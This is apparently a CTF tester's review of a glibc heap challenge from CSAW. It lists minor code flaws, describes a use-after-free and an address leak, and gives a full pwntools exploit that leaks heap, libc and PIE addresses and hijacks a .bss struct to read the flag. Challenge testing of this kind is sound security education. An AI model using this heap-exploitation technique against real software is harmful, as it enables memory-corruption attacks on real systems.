# **Comments:**

1. It's a good challenge for learning a new version glibc and I consider there is no more easy way to get the flag than except solution because of the limitation of malloc/calloc and the data we could modify.
2.  some little flaws: (all of them would not generate a unexcepted solution)
    1. we don't need `fflush(stdout)` because we have set `stdout` buffer to 0 | in function `get_ulong` and `get_unum`
    2. In function `sign` , the result of `int index = read(0, globals.sign, 12);` could not be trusted so that `globals.sign[index - 1] = '\0';` could lead to `negtive-overflow` . And same in `get_lucky_num` , if we call it twice, it would lead to undefined action.
    3. function `focus` could be removed, because people could trigger consolidate by `scanf` . And you could keep it because I think it's too tricky for people and that's not the goal of the challenge.
    4. `index` in `print_8ball_fortune` and `print_cookie_fortune` is unsigned int so we don't need to check if it is larger than 0.
    5. `if (index != 0)` is not necessary in `delete_cookie` because `index` would not be `0` . 
    6. `question[0x6f] = '\0';` in function `ask_8ball` could be remove, it makes the vulnerability seems a`purposive` one

# Tester's Solution

1. There are two vulnerabilities that could be used to generate an exploit in this challenge, due to the limited time, I cheated by reading the source code and asking Ian for some tips. It took me about 9 hours to finish that challenge. 
    1. First vulnerability, UAF if delete the last one; could be reused by delete + fill the array
    
    ```c
    free(c[index++].next);
      for (; index < globals.curr_cookie_index; index++) {
        if (index != 0) {
          c[index].prev = c[index].next;
          c[index].next->next = (unsigned int *)&c[index - 1];
        }
        if (index != MAX_COOKIES - 1) {
          c[index].next = c[index + 1].next;
        }
        else {
          c[index].prev = 0;
          c[index].next = 0;
          globals.curr_cookie_index--;
        }
      }
    ```
    
    b. Second vulnerability, address leak
    
    ```c
    read(0, question + 17, 0x70 - 17);
      question[0x6f] = '\0';
    ```
    

 

1. Leak heap, libc-base, and PIE by UAF, UAF+consolidate, and Second Vul.
2. Hijack global struct in .bss, read the flag.

# Tester's EXP

```c
from pwn import *
#context.log_level='debug'
def cmd(c):
	p.sendlineafter("> ",str(c).encode("utf8"))
def sign():
	cmd(0)
	p.sendlineafter("> ",b"Aries")
def malloc(c=b'./flag.txt\0',save=1):
	cmd(1)
	p.sendlineafter("> ",c)
	if(save==1):
		p.sendlineafter("> ",b'Y')
	else:
		p.sendlineafter("> ",b'N')
def add(c=-1):
	cmd(2)
	if(c!=-1):
		cmd(c)
def show(idx):
	cmd(4)
	cmd(idx)
def d():
	cmd(5)
def smc(c,d=b'1'):
	cmd(8)
	if(c==1):
		p.sendlineafter("> ",d)
	else:
		p.sendlineafter("> ",b'N')
		p.sendlineafter("> ",b'Y')
#p=process("./main")#,env={"LD_PRELOAD":'./libc.so.6'})
p=remote("pwn.chal.csaw.io",5010)
for x in range(6):
	smc(1)
	smc(0)
for x in range(0x21):
	add()
for x in range(8):
	malloc()
for x in range(7):
	d()
add(0x20)
show(0x20)
p.read(1)
heap=(u64(p.readline()[:-1].ljust(8,b'\0'))<<12)-0x1000
log.warning(hex(heap))
cmd("1"*0x500)
show(0x20)
p.read(1)
base=u64(p.readline()[:-1].ljust(8,b'\0'))-(0x7ffff7fb2d30-0x7ffff7dc0000)
log.warning(hex(base))
for x in range(7):
	malloc()
cmd(1)
p.sendafter("> ",b"A"*(0x70-17-0x8))
p.sendlineafter("> ",b"Y")
cmd(3)
cmd(8)
p.readuntil(b'A'*(0x70-17-8))
pie=u64(p.readline()[:-1]+b'\0\0')-(0x55555555a2a0-0x0000555555554000)
log.warning(hex(pie))
add(0x1f)
add()
for x in range(6):
	d()
add(0x20)
smc(1)
smc(0)
cmd("1"*0x500)
smc(1)
smc(0)
smc(1)
add(0x20)
cmd(8)
p.sendlineafter("> ",b'Y')
p.send(p64((0x55555555a020-0x555555554000+pie)^((heap>>12)+1)))
sign()
cmd(7)
p.sendafter("> ",p64(0x55555555c3f1-0x55555555b000+heap)+p64(1))
#gdb.attach(p)
cmd(6)
p.interactive("")
```
